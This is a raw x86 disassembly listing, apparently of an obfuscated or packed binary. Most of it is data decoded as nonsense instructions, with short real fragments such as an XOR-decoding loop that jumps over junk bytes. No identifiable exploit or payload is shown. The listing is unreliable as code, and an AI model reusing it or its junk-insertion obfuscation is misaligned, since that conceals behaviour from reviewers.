  4079b4:	jge    0x4079d0
  4079b6:	pusha  
  4079b7:	dec    BYTE PTR [ecx+0x67eab24d]
  4079bd:	lahf   
  4079be:	test   DWORD PTR [edi],0x73b6544e
  4079c4:	sub    BYTE PTR [ebx],cl
  4079c6:	rcr    DWORD PTR [edi+eax*2],cl
  4079c9:	(bad)  
  4079ca:	cwde   
  4079cb:	in     eax,0xb9
  4079cd:	or     ebp,ebp
  4079cf:	pushf  
  4079d0:	sub    dh,bh
  4079d2:	xor    ebx,DWORD PTR [edi+eiz*1]
  4079d5:	scas   al,BYTE PTR es:[edi]
  4079d6:	xor    DWORD PTR [ebx+0x6e],edi
  4079d9:	retf   
  4079da:	push   ds
  4079db:	xor    BYTE PTR [edx-0x220c4a0],cl
  4079e1:	iret   
  4079e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e3:	and    cl,BYTE PTR [ebp-0x3e014c67]
  4079e9:	add    ebp,eax
  4079eb:	stc    
  4079ec:	sub    bl,BYTE PTR [ebx+0x75]
  4079ef:	cld    
  4079f0:	pop    ecx
  4079f1:	sbb    esi,esi
  4079f3:	stc    
  4079f4:	xchg   esi,eax
  4079f5:	les    edi,FWORD PTR [eax+ebx*8-0x6cd10edd]
  4079fc:	bswap  eax
  4079fe:	dec    esp
  4079ff:	(bad)  
  407a00:	aad    0x7b
  407a02:	jbe    0x407a25
  407a04:	add    BYTE PTR [ebx],0xca
  407a07:	push   ds
  407a08:	not    eax
  407a0a:	jae    0x4079ee
  407a0c:	sbb    ch,BYTE PTR gs:[edi+edx*2-0x67]
  407a11:	ret    0x6fe4
  407a14:	mov    eax,ds:0x3a919cd5
  407a19:	mov    ?,WORD PTR [edi-0x586d1c71]
  407a1f:	imul   ebp,edi,0xc4e30b76
  407a25:	pop    esi
  407a26:	jbe    0x407a76
  407a28:	std    
  407a29:	loopne 0x407a34
  407a2b:	sub    esi,DWORD PTR [ecx+0x41]
  407a2e:	add    DWORD PTR [edi-0x20e27984],esp
  407a34:	xchg   ebx,eax
  407a35:	or     bh,BYTE PTR [ecx-0x5f]
  407a38:	sbb    ebp,DWORD PTR [ecx]
  407a3a:	mov    dl,0x2d
  407a3c:	pusha  
  407a3d:	mov    DWORD PTR [eax+eax*2+0x3313f4f0],ecx
  407a44:	pusha  
  407a45:	retf   
  407a46:	and    DWORD PTR [edx+0x3f],edx
  407a49:	adc    eax,eax
  407a4b:	loope  0x407a35
  407a4d:	cmc    
  407a4e:	push   esi
  407a4f:	xchg   ebx,eax
  407a50:	ss (bad) 
  407a53:	adc    ch,BYTE PTR [edi-0x320d8dc0]
  407a59:	dec    esp
  407a5a:	or     BYTE PTR [eax+0x4f],dl
  407a5d:	jle    0x4079eb
  407a5f:	jp     0x4079fd
  407a61:	add    eax,edi
  407a63:	push   ds
  407a64:	scas   eax,DWORD PTR es:[edi]
  407a65:	xchg   edi,eax
  407a66:	retf   
  407a67:	pop    esi
  407a68:	es icebp 
  407a6a:	jl     0x4079ec
  407a6c:	jecxz  0x407ac8
  407a6e:	mov    eax,ds:0xcce2ec23
  407a73:	cmp    eax,0x66747496
  407a78:	or     BYTE PTR [eax],al
  407a7a:	pop    edi
  407a7b:	xchg   edi,eax
  407a7c:	add    ch,BYTE PTR [eax+edx*2-0x78b67f95]
  407a83:	imul   ebx,DWORD PTR [ebp+0x5a5e9022],0xf1332274
  407a8d:	adc    DWORD PTR [ebp+0x4c1f208a],0xeae02a13
  407a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a98:	loopne 0x407ad1
  407a9a:	in     eax,0x18
  407a9c:	bound  esi,QWORD PTR [edx-0x27748213]
  407aa2:	aam    0x66
  407aa4:	cld    
  407aa5:	mov    eax,edx
  407aa7:	cmp    DWORD PTR [edx],esi
  407aa9:	sub    BYTE PTR [edx],ch
  407aab:	or     esp,esp
  407aad:	cs loope 0x407a74
  407ab0:	sbb    bl,ch
  407ab2:	(bad)  [ebx]
  407ab4:	pop    ds
  407ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ab6:	cmp    ch,BYTE PTR [esi-0x7f34b0bd]
  407abc:	int    0x21
  407abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407abf:	cmp    eax,0x62e30973
  407ac4:	or     edx,DWORD PTR [ebx+esi*2+0x7bab145d]
  407acb:	dec    edx
  407acc:	dec    ecx
  407acd:	and    ebp,0x27
  407ad0:	pop    eax
  407ad1:	es test al,0xf4
  407ad4:	cmp    al,0xf4
  407ad6:	lods   eax,DWORD PTR ds:[esi]
  407ad7:	sbb    esp,edi
  407ad9:	dec    eax
  407ada:	pop    ebx
  407adb:	inc    eax
  407adc:	loopne 0x407b2e
  407ade:	stos   DWORD PTR es:[edi],eax
  407adf:	loop   0x407b48
  407ae1:	push   es
  407ae2:	imul   edx,DWORD PTR [esi+0x4e],0xfffffffa
  407ae6:	xchg   ebp,eax
  407ae7:	mov    eax,ds:0xbf4097a4
  407aec:	jmp    FWORD PTR [ecx+0x5c]
  407aef:	cmc    
  407af0:	mov    ecx,0xb37d94fe
  407af5:	mov    eax,0x7e58d96
  407afa:	out    dx,al
  407afb:	push   esi
  407afc:	sahf   
  407afd:	inc    ebx
  407afe:	mov    eax,ds:0x7df7a08e
  407b03:	aad    0x2c
  407b05:	or     ebx,esp
  407b07:	mov    edx,eax
  407b09:	int3   
  407b0a:	fstp   QWORD PTR [esi+0x21]
  407b0d:	mov    esi,edx
  407b0f:	in     eax,dx
  407b10:	jmp    0xf0b0:0xb56b78ef
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	ficomp DWORD PTR [edx]
  407b4d:	pop    ebx
  407b4e:	mov    dh,0x7d
  407b50:	lds    edi,FWORD PTR [esi+0x7e]
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407b95
  407b58:	add    DWORD PTR [ebx],edx
  407b5a:	loopne 0x407b43
  407b5c:	ss cmp esi,0x11531e22
  407b63:	ins    DWORD PTR es:[edi],dx
  407b64:	das    
  407b65:	add    bl,BYTE PTR [esi]
  407b67:	mov    cl,0xb2
  407b69:	mov    esi,0x783c918d
  407b6e:	mov    bl,0x29
  407b70:	fadd   QWORD PTR [edx+eiz*2-0x9]
  407b74:	scas   al,BYTE PTR es:[edi]
  407b75:	xchg   esi,eax
  407b76:	cmp    eax,ecx
  407b78:	mov    edi,0xb1665ffd
  407b7d:	cmp    al,0x47
  407b7f:	or     al,0x67
  407b81:	fdiv   DWORD PTR [eax-0xc]
  407b84:	mov    ds:0x2a341274,eax
  407b89:	fxch   st(6)
  407b8b:	shl    bh,1
  407b8d:	xor    dh,ch
  407b8f:	inc    ebp
  407b90:	call   0xcfe6:0xb1dd6ac9
  407b97:	(bad)  
  407b98:	cwde   
  407b99:	test   BYTE PTR [eax+0x71],bh
  407b9c:	inc    esi
  407b9d:	cmp    eax,0x9134591e
  407ba2:	test   BYTE PTR ds:0x86ff93b8,cl
  407ba8:	pop    ecx
  407ba9:	xor    BYTE PTR [edx+0x7e],ah
  407bac:	repnz stos BYTE PTR es:[edi],al
  407bae:	popf   
  407baf:	mov    ch,cl
  407bb1:	arpl   WORD PTR [ebx-0x56],bp
  407bb4:	fwait
  407bb5:	int3   
  407bb6:	sub    dl,BYTE PTR [esi+0x18]
  407bb9:	or     al,0x8a
  407bbb:	sbb    eax,0x7309d605
  407bc0:	std    
  407bc1:	pusha  
  407bc2:	sahf   
  407bc3:	fcmovnbe st,st(3)
  407bc5:	cmp    DWORD PTR [ecx],0x919a45fb
  407bcb:	test   BYTE PTR [ebp+0x51b5da7c],dl
  407bd1:	scas   al,BYTE PTR es:[edi]
  407bd2:	stc    
  407bd3:	sbb    ebp,DWORD PTR [eax+0x53e9656c]
  407bd9:	in     al,0x3e
  407bdb:	push   es
  407bdc:	stos   DWORD PTR es:[edi],eax
  407bdd:	pop    edx
  407bde:	mov    cl,0x88
  407be0:	pop    edi
  407be1:	ja     0x407bc1
  407be3:	lock or ecx,DWORD PTR [eax+0x50]
  407be7:	xor    ebx,ecx
  407be9:	mov    edi,0x634e2d8e
  407bee:	sbb    al,0x40
  407bf0:	inc    edi
  407bf1:	std    
  407bf2:	test   al,0xff
  407bf4:	adc    eax,0xa74429d4
  407bf9:	ins    DWORD PTR es:[edi],dx
  407bfa:	dec    ebp
  407bfb:	dec    ecx
  407bfc:	sbb    eax,0x722dd2cb
  407c01:	rol    ch,1
  407c03:	call   0x59293337
  407c08:	push   ebx
  407c09:	(bad)  
  407c0a:	xor    cl,BYTE PTR [eax+0x73]
  407c0d:	cmp    esp,DWORD PTR [edi]
  407c0f:	or     al,0x9a
  407c11:	lock dec ecx
  407c13:	popf   
  407c14:	push   0x8d287419
  407c19:	jp     0x407c88
  407c1b:	adc    ch,BYTE PTR [esi+0x783e893b]
  407c21:	idiv   BYTE PTR [ebp+0xc]
  407c24:	or     BYTE PTR [edx+0x15],0x27
  407c28:	shr    BYTE PTR [ecx],0x8
  407c2b:	ror    DWORD PTR [eax+0x44],cl
  407c2e:	dec    ebp
  407c2f:	fstp   TBYTE PTR [esi+edx*8-0xdcfe955]
  407c36:	mov    bl,dh
  407c38:	push   ebx
  407c39:	es sbb eax,edi
  407c3c:	xor    DWORD PTR [eax],esp
  407c3e:	sbb    BYTE PTR [ebx+ebp*1],ch
  407c41:	out    dx,eax
  407c42:	push   ebp
  407c43:	and    eax,0x1c77fce1
  407c48:	lock dec ecx
  407c4a:	and    ebx,DWORD PTR [ecx]
  407c4c:	fadd   QWORD PTR ss:[ecx-0x63]
  407c50:	popf   
  407c51:	cli    
  407c52:	lods   eax,DWORD PTR ds:[esi]
  407c53:	into   
  407c54:	imul   ecx,esp,0x2d
  407c57:	repz pop es
  407c59:	(bad)  
  407c5a:	xor    BYTE PTR [edx],ah
  407c5c:	cmp    eax,0x5f912e69
  407c61:	je     0x407cdb
  407c63:	mov    edi,0xf5c7999f
  407c68:	adc    al,0x6b
  407c6a:	jmp    0x407cca
  407c6c:	rcr    BYTE PTR [ecx-0x1c],0xb
  407c70:	push   esi
  407c71:	jmp    0xaff5f8ed
  407c76:	xchg   ebx,eax
  407c77:	adc    DWORD PTR [esi-0x6ca37a0c],esp
  407c7d:	jmp    0x2369:0x822add3c
  407c84:	xchg   DWORD PTR [ebp-0x63744bae],ebp
  407c8a:	arpl   WORD PTR [edx],cx
  407c8c:	or     BYTE PTR [edi+0x24],bh
  407c8f:	dec    esi
  407c90:	call   0x5cc4:0xb4d1e8ec
  407c97:	inc    edi
  407c98:	cld    
  407c99:	mov    ecx,0x78c3317
  407c9e:	sub    ah,BYTE PTR [ebp-0x16a58d47]
  407ca4:	xchg   ebx,eax
  407ca5:	jle    0x407cf1
  407ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ca8:	inc    ebx
  407ca9:	popf   
  407caa:	dec    ecx
  407cab:	mov    BYTE PTR [edx],al
  407cad:	repnz cwde 
  407caf:	mov    dl,0x97
  407cb1:	fxch   st(7)
  407cb3:	mov    ebp,0x476f53aa
  407cb8:	jns    0x407d32
  407cba:	dec    ebp
  407cbb:	mov    eax,DWORD PTR [ebp-0x8]
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	call   0x7ec7:0xd1508edf
  407ce6:	jle    0x407cba
  407ce8:	jg     0x407d68
  407cea:	jle    0x407cd6
  407cec:	xchg   edi,eax
  407ced:	sbb    eax,0x7780434a
  407cf2:	or     al,0x3e
  407cf4:	stos   BYTE PTR es:[edi],al
  407cf5:	cmp    bl,BYTE PTR [ebp+0x7fd74fdd]
  407cfb:	jmp    0x7c9c:0x83d783d4
  407d02:	xchg   esp,eax
  407d03:	cs or  al,0xc0
  407d06:	jb     0x407d13
  407d08:	(bad)  
  407d09:	stc    
  407d0a:	leave  
  407d0b:	(bad)
  407d0e:	in     eax,dx
  407d0f:	sti    
  407d10:	fucom  st(0)
  407d12:	mov    ds,eax
  407d14:	or     ebp,DWORD PTR [ebp-0xd]
  407d17:	ror    BYTE PTR [eax+0x390187d9],cl
  407d1d:	clc    
  407d1e:	inc    ecx
  407d1f:	sub    edi,DWORD PTR [ecx+0x5b459b8d]
  407d25:	outs   dx,BYTE PTR ds:[esi]
  407d26:	adc    eax,0xb0073c04
  407d2b:	jmp    0xdbf9:0xfd755d14
  407d32:	mov    bh,0xb
  407d34:	je     0x407d7f
  407d36:	adc    ch,BYTE PTR [eax+ebp*1-0x7c]
  407d3a:	pop    ecx
  407d3b:	out    dx,al
  407d3c:	ss mov bh,0xde
  407d3f:	mov    ss,WORD PTR [esi+0x1491a4a0]
  407d45:	jge    0x407d97
  407d47:	pop    ebp
  407d48:	mov    esp,0xef66163f
  407d4d:	shr    BYTE PTR [edx+ecx*8],0xae
  407d51:	push   eax
  407d52:	dec    esp
  407d53:	pop    ebx
  407d54:	inc    ebx
  407d55:	bound  ecx,QWORD PTR [eax-0x23]
  407d58:	cld    
  407d59:	sbb    al,0xc5
  407d5b:	adc    BYTE PTR [edx],0x19
  407d5e:	pushf  
  407d5f:	mov    esi,0x121a6fd2
  407d64:	add    eax,0x12b6bf3e
  407d69:	push   edx
  407d6a:	in     al,dx
  407d6b:	les    ebx,FWORD PTR [edi+0x23]
  407d6e:	ret    0x4e5b
  407d71:	or     BYTE PTR [ebp+0x72f32f18],0x72
  407d78:	and    al,0x58
  407d7a:	push   ss
  407d7b:	loop   0x407d94
  407d7d:	(bad)  
  407d7e:	out    dx,eax
  407d7f:	push   ebp
  407d80:	ficomp DWORD PTR [ecx+0x50ed1a84]
  407d86:	fmul   DWORD PTR [esi+0x5]
  407d89:	cmp    al,0xdf
  407d8b:	and    edx,DWORD PTR [eax+0x3f]
  407d8e:	(bad)  
  407d8f:	xor    BYTE PTR [edx-0x2c449210],dh
  407d95:	pop    edi
  407d96:	(bad)  
  407d97:	(bad)  
  407d98:	(bad)  
  407d9a:	xchg   edi,esi
  407d9c:	ins    BYTE PTR es:[edi],dx
  407d9d:	sbb    bl,dl
  407d9f:	mov    ebx,0x6dd48926
  407da4:	popa   
  407da5:	pop    ds
  407da6:	mov    esi,0xfd30c619
  407dab:	jg     0x407de4
  407dad:	arpl   WORD PTR [edx-0x69afe1aa],sp
  407db3:	cmp    BYTE PTR [ecx],bl
  407db5:	lods   al,BYTE PTR ds:[esi]
  407db6:	mov    bh,0x59
  407db8:	mov    esp,0x7e38e64e
  407dbd:	mov    al,0x78
  407dbf:	push   0x1f
  407dc1:	fmulp  st(2),st
  407dc3:	xor    ebp,DWORD PTR [edx]
  407dc5:	inc    edi
  407dc6:	xchg   DWORD PTR [ecx+0x70d54726],ecx
  407dcc:	jbe    0x407e0c
  407dce:	fild   WORD PTR [ecx-0x46]
  407dd1:	aam    0x8
  407dd3:	ret    
  407dd4:	in     al,dx
  407dd5:	sub    eax,0x35a83e48
  407dda:	sbb    ecx,DWORD PTR [edi+0x7f]
  407ddd:	jecxz  0x407d96
  407ddf:	shl    DWORD PTR [ebp+0x46],1
  407de2:	or     dl,BYTE PTR [ebx-0x6fe0e64e]
  407de8:	dec    ecx
  407de9:	dec    ecx
  407dea:	fninit 
  407dec:	mov    ah,0x9b
  407dee:	push   ebx
  407def:	adc    eax,0x92e95bd9
  407df4:	aaa    
  407df5:	jecxz  0x407e0c
  407df7:	sar    dl,0x89
  407dfa:	jae    0x407dde
  407dfc:	pop    esi
  407dfd:	jmp    0xefa62ea6
  407e02:	pop    esi
  407e03:	mov    BYTE PTR [edx+0x26],ah
  407e06:	clc    
  407e07:	or     ah,dl
  407e09:	and    eax,ebx
  407e0b:	lea    ebp,[ecx]
  407e0d:	inc    ebp
  407e0e:	mov    al,0x2c
  407e10:	pusha  
  407e11:	push   ebp
  407e12:	lock fimul WORD PTR [eax]
  407e15:	ret    
  407e16:	sbb    BYTE PTR [ebp+ebp*2+0x19],al
  407e1a:	nop
  407e1b:	pop    edi
  407e1c:	sub    al,dl
  407e1e:	out    dx,al
  407e1f:	push   eax
  407e20:	and    eax,0x94be23dc
  407e25:	je     0x407e44
  407e27:	sbb    esi,DWORD PTR [ebp+0x3b]
  407e2a:	and    DWORD PTR [ebp-0x71],edi
  407e2d:	xor    al,0x11
  407e2f:	jle    0x407e4d
  407e31:	dec    eax
  407e32:	or     dh,dl
  407e34:	(bad)  
  407e35:	lock shr ecx,1
  407e38:	pop    ebp
  407e39:	add    bl,ah
  407e3b:	push   cs
  407e3c:	test   DWORD PTR [eax+0x6a7b3f6d],esi
  407e42:	xchg   BYTE PTR [ecx+esi*1+0x6c],dh
  407e46:	cmp    BYTE PTR [esi-0x10],cl
  407e49:	fdivr  DWORD PTR [eax]
  407e4b:	out    0xf4,al
  407e4d:	inc    edi
  407e4e:	int3   
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x6
  407ea7:	dec    ecx
  407ea8:	mov    ch,0xff
  407eaa:	mov    ch,0xd8
  407eac:	jle    0x407f2c
  407eae:	sar    BYTE PTR [edi+0x7e],cl
  407eb1:	jle    0x407ebd
  407eb3:	std    
  407eb4:	xchg   edx,eax
  407eb5:	fcomip st,st(3)
  407eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb8:	dec    edx
  407eb9:	stc    
  407eba:	shl    DWORD PTR [edx+0x2d],cl
  407ebd:	arpl   bp,cx
  407ebf:	add    ah,BYTE PTR [ecx-0x63]
  407ec2:	mov    al,0x8b
  407ec4:	enter  0xc2c8,0xd3
  407ec8:	pop    esi
  407ec9:	nop
  407eca:	mov    cl,0xf
  407ecc:	leave  
  407ecd:	aam    0xeb
  407ecf:	sbb    eax,0xde47e88a
  407ed4:	pop    ds
  407ed5:	pop    edi
  407ed6:	add    BYTE PTR [ecx+0x39],dh
  407ed9:	mov    ch,0x71
  407edb:	mov    al,0x2e
  407edd:	push   eax
  407ede:	call   0xf29f4525
  407ee3:	dec    edx
  407ee4:	jmp    0x2dbd:0x94cc9a51
  407eeb:	or     cl,ch
  407eed:	in     al,0x23
  407eef:	mul    esi
  407ef1:	enter  0xafd3,0xdf
  407ef5:	mov    cl,0x90
  407ef7:	dec    ebp
  407ef8:	inc    ebp
  407ef9:	in     eax,0x65
  407efb:	dec    edi
  407efc:	xor    DWORD PTR [eiz*1-0x303caff2],ecx
  407f03:	mov    esp,0x984dc32
  407f08:	or     eax,DWORD PTR [ebx+0x25]
  407f0b:	pop    ebp
  407f0c:	pop    ecx
  407f0d:	test   eax,0x4387b55e
  407f12:	int3   
  407f13:	loopne 0x407f2b
  407f15:	pop    edi
  407f16:	fdiv   DWORD PTR [esi+0xd]
  407f19:	jmp    0xfc40:0x2af1626
  407f20:	cmc    
  407f21:	call   0xe3f6:0xb1bdbbac
  407f28:	add    dh,cl
  407f2a:	lea    ebx,[ebx-0x36]
  407f2d:	nop
  407f2e:	pop    ebx
  407f2f:	fs mov al,0xe2
  407f32:	pop    edi
  407f33:	es jne 0x407f92
  407f36:	pop    ebx
  407f37:	out    0x6,eax
  407f39:	jns    0x407fa2
  407f3b:	mov    bh,0x63
  407f3d:	ss and bl,cl
  407f40:	shl    ebx,0x7c
  407f43:	retf   
  407f44:	push   esp
  407f45:	das    
  407f46:	adc    dh,BYTE PTR [eax-0x26]
  407f49:	add    eax,0x40632e69
  407f4e:	jmp    0x407f0a
  407f50:	mov    esi,0x56bca938
  407f55:	(bad)  
  407f56:	sbb    BYTE PTR [eax+ecx*4-0x67692d0],ch
  407f5d:	add    edx,DWORD PTR [edx+0x41]
  407f60:	mov    gs:0x6a6d4d4c,al
  407f66:	sbb    BYTE PTR [ecx-0x631b05ac],ch
  407f6c:	and    al,0xe3
  407f6e:	jge    0x407f3b
  407f70:	add    al,0x3d
  407f72:	jge    0x407f86
  407f74:	out    0x3d,al
  407f76:	out    dx,eax
  407f77:	mov    ds:0x6f40a4f8,al
  407f7c:	xor    bh,bh
  407f7e:	rcl    BYTE PTR ds:[esi+0x29],cl
  407f82:	inc    edx
  407f83:	sbb    esi,DWORD PTR [eax-0x61]
  407f86:	addr16 jl 0x407fac
  407f89:	outs   dx,BYTE PTR ds:[esi]
  407f8a:	in     eax,dx
  407f8b:	and    ch,al
  407f8d:	jb     0x407fa6
  407f8f:	rcr    BYTE PTR [edx-0x2e],cl
  407f92:	fwait
  407f93:	cmp    eax,0xa7bf0628
  407f98:	scas   eax,DWORD PTR es:[edi]
  407f99:	mov    BYTE PTR [edi],cl
  407f9b:	cmp    esp,DWORD PTR [esi+ebp*1+0x2f]
  407f9f:	imul   esi,DWORD PTR [esi-0x4b2656ee],0x37749b48
  407fa9:	fcom   DWORD PTR [edx+0x6ea70199]
  407faf:	fs jp  0x407f8c
  407fb2:	enter  0x6551,0xf
  407fb6:	push   es
  407fb7:	adc    al,0xf8
  407fb9:	add    al,0x2f
  407fbb:	push   0xfffffffd
  407fbd:	out    dx,al
  407fbe:	inc    WORD PTR [eax+edx*8+0x59]
  407fc3:	or     bh,BYTE PTR ds:0x69635d66
  407fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fca:	mov    edx,0xcef4bd10
  407fcf:	dec    edi
  407fd0:	in     al,dx
  407fd1:	outs   dx,BYTE PTR ds:[esi]
  407fd2:	lods   eax,DWORD PTR ds:[esi]
  407fd3:	add    edi,0xd2c5c0fa
  407fd9:	mov    BYTE PTR [edx+0x57],ah
  407fdc:	sub    eax,0xcd7940e2
  407fe1:	mov    esi,0x5846480f
  407fe6:	gs popa 
  407fe8:	cmc    
  407fe9:	adc    BYTE PTR [ebx+0x5d8688dc],al
  407fef:	pusha  
  407ff0:	or     DWORD PTR [esi+ebp*4-0x80],ecx
  407ff4:	mov    eax,ds:0x9e1fc86a
  407ff9:	and    al,0x85
  407ffb:	fadd   QWORD PTR [eax-0x3d60a0fb]
  408001:	outs   dx,DWORD PTR ds:[esi]
  408002:	xchg   ecx,eax
  408003:	and    eax,0x26b94a25
  408008:	add    DWORD PTR [edx-0x44],0x71811c2a
  40800f:	push   DWORD PTR [edi]
  408011:	push   esp
  408012:	sbb    eax,0x8902165b
  408017:	inc    ebp
  408018:	in     al,dx
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x5683314],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x408058
  408040:	ret    
  408041:	ret    0x99e4
  408044:	inc    ebp
  408045:	sbb    al,0x32
  408047:	mov    ah,0xfb
  408049:	inc    edi
  40804a:	inc    ecx
  40804b:	mov    cl,0xbf
  40804d:	jns    0x408042
  40804f:	add    BYTE PTR [ebp-0x57d07aae],cl
  408055:	push   ss
  408056:	hlt    
  408057:	in     al,0xf6
  408059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40805a:	sub    al,0x43
  40805c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40805d:	or     DWORD PTR [ecx-0x73516083],edx
  408063:	dec    edx
  408064:	test   al,0x74
  408066:	xor    eax,0xa6b37423
  40806b:	cld    
  40806c:	hlt    
  40806d:	ffree  st(7)
  40806f:	mov    ecx,es
  408071:	jp     0x40808e
  408073:	jnp    0x408097
  408075:	pop    eax
  408076:	(bad)  
  408078:	loop   0x408070
  40807a:	push   ebp
  40807b:	inc    dh
  40807d:	sub    dh,BYTE PTR [edi]
  40807f:	mov    cl,dl
  408081:	jl     0x40802c
  408083:	pop    es
  408084:	push   eax
  408085:	mov    WORD PTR [edx+ebx*8],es
  408088:	inc    edi
  408089:	pop    ebx
  40808a:	xlat   BYTE PTR ds:[ebx]
  40808b:	pop    esi
  40808c:	inc    ebp
  40808d:	nop
  40808e:	arpl   WORD PTR ds:0x71852237,si
  408094:	ss dec ecx
  408096:	jmp    0x4080fd
  408098:	cmp    DWORD PTR [ebp-0x5a1f6668],esi
  40809e:	pop    ecx
  40809f:	pusha  
  4080a0:	jnp    0x4080f2
  4080a2:	stos   BYTE PTR es:[edi],al
  4080a3:	cmp    al,0x5e
  4080a5:	pop    ecx
  4080a6:	xlat   BYTE PTR ds:[ebx]
  4080a7:	scas   eax,DWORD PTR es:[edi]
  4080a8:	pop    ebx
  4080a9:	xchg   esp,eax
  4080aa:	xor    eax,0xa58160e7
  4080af:	cld    
  4080b0:	xchg   ebp,eax
  4080b1:	jno    0x40811c
  4080b3:	jecxz  0x4080a4
  4080b5:	imul   ebx,ecx,0x409bc4bb
  4080bb:	push   ss
  4080bc:	mov    ebp,0x7ea5ce8f
  4080c1:	push   ss
  4080c2:	xchg   esp,eax
  4080c3:	sbb    edx,eax
  4080c5:	jg     0x4080a4
  4080c7:	addr16 dec ecx
  4080c9:	imul   esp,DWORD PTR [ebx+0x22],0xffffffef
  4080cd:	dec    ebp
  4080ce:	and    BYTE PTR [eax],ch
  4080d0:	sti    
  4080d1:	jne    0x408111
  4080d3:	dec    ebx
  4080d4:	xchg   edx,eax
  4080d5:	sar    al,1
  4080d7:	pop    ds
  4080d8:	nop
  4080d9:	jg     0x40810e
  4080db:	cmp    eax,0x3f843e68
  4080e0:	cmc    
  4080e1:	or     edi,edi
  4080e3:	jnp    0x408142
  4080e5:	xchg   edi,eax
  4080e6:	scas   al,BYTE PTR es:[edi]
  4080e7:	push   eax
  4080e8:	lods   eax,DWORD PTR ds:[esi]
  4080e9:	mov    ch,0xac
  4080eb:	lods   eax,DWORD PTR ds:[esi]
  4080ec:	fwait
  4080ed:	and    dh,BYTE PTR [edi]
  4080ef:	push   ss
  4080f0:	push   edx
  4080f1:	pop    DWORD PTR [ebx]
  4080f3:	sbb    dh,cl
  4080f5:	sub    esi,0xd
  4080f8:	rol    edx,0x11
  4080fb:	imul   edi,DWORD PTR [edx-0x37],0x71
  4080ff:	cmp    bh,bl
  408101:	(bad)  
  408102:	mov    al,ds:0x6bfb2bce
  408108:	cmp    al,0x82
  40810a:	das    
  40810b:	jbe    0x4080c8
  40810d:	jne    0x40813a
  40810f:	out    dx,al
  408110:	sub    ch,BYTE PTR [edi]
  408112:	retf   
  408113:	xchg   ebx,eax
  408114:	lock mov ebp,0x9b8b8124
  40811a:	fs xor al,0x6
  40811d:	jne    0x408184
  40811f:	xchg   ebx,eax
  408120:	mov    eax,0xf2171700
  408125:	cmp    esp,DWORD PTR [edi]
  408127:	and    al,0xc3
  408129:	sub    edi,eax
  40812b:	inc    ecx
  40812c:	leave  
  40812d:	inc    esi
  40812e:	jmp    0xdcce:0xf5596efd
  408135:	cdq    
  408136:	cmp    ecx,esi
  408138:	cmc    
  408139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40813a:	repz dec edx
  40813c:	inc    ebp
  40813d:	xor    eax,0x2666516
  408142:	out    0xc4,al
  408144:	mov    bl,0x48
  408146:	rcl    BYTE PTR [eax+0x24e5fae3],0x90
  40814d:	inc    eax
  40814e:	in     al,0xa7
  408150:	sub    edx,edi
  408152:	and    al,0xcd
  408154:	cmp    al,0x28
  408156:	in     al,0xd
  408158:	or     BYTE PTR [ebp-0x3],ch
  40815b:	leave  
  40815c:	sti    
  40815d:	jl     0x40819b
  40815f:	xchg   DWORD PTR [edx],ebp
  408161:	jle    0x4081e1
